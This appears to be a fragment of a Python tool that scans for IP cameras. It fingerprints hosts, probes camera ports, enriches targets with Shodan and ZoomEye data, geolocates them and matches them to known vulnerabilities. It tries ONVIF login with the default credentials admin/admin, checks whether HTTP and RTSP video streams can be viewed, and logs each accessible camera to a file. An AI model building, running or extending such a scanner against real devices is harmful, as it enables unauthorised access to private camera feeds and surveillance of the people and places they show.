    except KeyboardInterrupt:
        logger.info("Scanner interrupted by user")
    except Exception as e:
        logger.critical(f"Fatal error: {str(e)}", exc_info=True)

def optimize_opencv():
    cv2.setNumThreads(4)
    cv2.ocl.setUseOpenCL(True)

# This helps us validate camera streams - makes sure they're actually working
async def validate_stream(url):
    async with opencv_capture(url) as cap:
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 3)
        return await process_frames(cap)

async def process_frames(cap, num_frames=30):
    valid_frames = 0
    for _ in range(num_frames):
        ret, frame = cap.read()
        if ret and frame is not None:
            valid_frames += 1
    return valid_frames > num_frames * 0.5

def create_rtsp_pipeline(url):
    return f"""
    rtspsrc location="{url}" !
    rtph264depay !
    h264parse !
    avdec_h264 !
    videoconvert !
    appsink
    """

async def enhanced_fingerprint(ip, port, session):
    result = {
        'headers': {},
        'banner': '',
        'tls_info': {},
        'response_time': 0
    }

    start_time = time.time()
    try:
        async with session.get(f"http://{ip}:{port}") as response:
            result['headers'] = dict(response.headers)
            result['response_time'] = time.time() - start_time
    except Exception as e:
        logger.debug(f"Fingerprint error for {ip}:{port}: {e}")

    return result

async def discover_onvif_devices(ip):
    try:
        cam = ONVIFCamera(ip, 80, 'admin', 'admin')
        device_info = await cam.devicemgmt.GetDeviceInformation()
        return device_info
    except Exception as e:
        logger.debug(f"ONVIF discovery error for {ip}: {e}")
        return None

async def enrich_results(result):
    try:
        if result['manufacturer'] in VULNERABILITY_DB:
            result['vulnerabilities'] = VULNERABILITY_DB[result['manufacturer']]

        try:
            with geoip2.database.Reader(GEOIP_DB_PATH) as reader:
                geo = reader.city(result['ip'])
                result['geolocation'] = {
                    'country': geo.country.name,
                    'city': geo.city.name,
                    'location': {
                        'lat': geo.location.latitude,
                        'lon': geo.location.longitude
                    }
                }
        except Exception as e:
            logger.debug(f"Geolocation error: {e}")

        result['fingerprint'] = await enhanced_fingerprint(
            result['ip'],
            result['port'],
            await connection_manager.get_session()
        )

    except Exception as e:
        logger.error(f"Error enriching results: {e}")

    return result

async def validate_url(url, session, auth=None):
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        async with session.get(url, auth=auth, headers=headers, timeout=URL_TIMEOUT, ssl=False, allow_redirects=True) as response:

            if response.status != 200:
                return False, None

            content_type = response.headers.get('Content-Type', '')
            if not any(t in content_type.lower() for t in ['image', 'video', 'stream', 'multipart']):
                return False, None

            content_length = response.headers.get('Content-Length', 0)
            if content_length and int(content_length) < MIN_CONTENT_LENGTH:
                return False, None

            if 'multipart' in content_type.lower():
                chunk = await response.content.read(1024)
                if not chunk:
                    return False, None

            return True, {
                "content_type": content_type,
                "content_length": content_length,
                "server": response.headers.get('Server'),
                "powered_by": response.headers.get('X-Powered-By'),
                "status_code": response.status
            }

    except Exception as e:
        logging.debug(f"URL validation error for {url}: {e}")
        return False, None

async def validate_rtsp_url(url):
    try:
        async with opencv_capture(url) as cap:
            ret, frame = cap.read()
            if not ret or frame is None:
                return False, None

            info = {
                "width": int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
                "height": int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)),
                "fps": int(cap.get(cv2.CAP_PROP_FPS)),
                "frame_count": int(cap.get(cv2.CAP_PROP_FRAME_COUNT)),
                "format": cap.get(cv2.CAP_PROP_FORMAT)
            }
            return True, info

    except Exception as e:
        logging.debug(f"RTSP validation error for {url}: {e}")
        return False, None

def save_valid_camera(camera_data):
    try:
        os.makedirs(os.path.dirname(VALID_CAMERAS_FILE), exist_ok=True)

        camera_data.update({
            "discovery_time": datetime.now().isoformat(),
            "camera_id": str(uuid.uuid4()),
            "last_verified": datetime.now().isoformat()
        })

        with open(VALID_CAMERAS_FILE, 'a') as f:
            json.dump(camera_data, f)
            f.write('\n')

        logging.info(f"[+] Saved valid camera: {camera_data['ip']}:{camera_data['port']}")

    except Exception as e:
        logging.error(f"[-] Error saving camera data: {e}")

SHODAN_API_KEY = "your_SHODAN_key"
ZOOMEYE_API_KEY = "your_zoomeye_key"

# Gets extra info about cameras from Shodan - like a cyber detective
async def search_shodan(ip):
    try:
        import shodan
        api = shodan.Shodan(SHODAN_API_KEY)
        result = api.host(ip)
        logger.debug(f"Shodan data retrieved for {ip}: {result}")
        return result
    except shodan.APIError as e:
        logger.debug(f"Shodan API error for {ip}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error querying Shodan for {ip}: {e}")
        return None

# ZoomEye is another great source of device info
async def search_zoomeye(ip):
    try:
        from zoomeye import ZoomEye
        api = ZoomEye()
        api.login("your_zoomeye_username", "your_zoomeye_password")
        query = f'ip:"{ip}"'
        result = api.dork_search(query)
        logger.debug(f"ZoomEye data retrieved for {ip}: {result}")
        return result
    except Exception as e:
        logger.error(f"Error querying ZoomEye for {ip}: {e}")
        return None

async def enrich_with_third_party_data(ip):
    # Tries different sources to get as much info as possible
    try:
        data = await search_shodan(ip)
        if data:
            return {
                'source': 'shodan',
                'ports': data.get('ports', []),
                'hostnames': data.get('hostnames', []),
                'os': data.get('os', ''),
                'organization': data.get('org', ''),
                'isp': data.get('isp', ''),
                'last_update': data.get('last_update', ''),
                'vulns': data.get('vulns', []),
                'tags': data.get('tags', [])
            }

        data = await search_zoomeye(ip)
        if data:
            return {
                'source': 'zoomeye',
                'ports': [match.get('portinfo', {}).get('port') for match in data],
                'components': [match.get('portinfo', {}).get('service') for match in data],
                'os': next((match.get('systeminfo', {}).get('os') for match in data), ''),
                'organization': next((match.get('geoinfo', {}).get('organization') for match in data), ''),
                'last_update': next((match.get('timestamp') for match in data), '')
            }

        session = await connection_manager.get_session()
        basic_data = {
            'source': 'direct_scan',
            'timestamp': datetime.now().isoformat(),
            'fingerprint': await enhanced_fingerprint(ip, 80, session),
            'onvif_info': await discover_onvif_devices(ip),
            'open_ports': [],
            'services': {}
        }

        for port in [80, 443, 554, 8080, 8443, 8554]:
            if await is_port_open_async(ip, port):
                basic_data['open_ports'].append(port)
                try:
                    service_info = await test_http_device_async(ip, port, session)
                    if service_info:
                        basic_data['services'][port] = service_info
                except:
                    pass

        return basic_data

    except Exception as e:
        logger.error(f"Error enriching data for {ip}: {e}")
        return {
            'source': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }